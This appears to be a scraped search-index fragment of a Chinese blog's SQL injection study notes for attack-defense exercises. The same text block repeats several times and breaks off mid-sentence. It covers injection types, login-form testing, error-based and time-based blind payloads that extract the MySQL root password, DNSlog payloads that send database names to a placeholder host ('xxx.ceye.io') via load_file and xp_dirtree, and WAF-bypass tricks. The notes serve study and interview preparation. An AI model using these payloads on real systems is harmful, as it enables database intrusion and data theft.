8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#13sql写入shell的条件"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#14找绝对路径的方法"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#15sqlmap中risk和levels区别"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#16数据库全局日志写入"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#17数据库慢查询日志写入"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 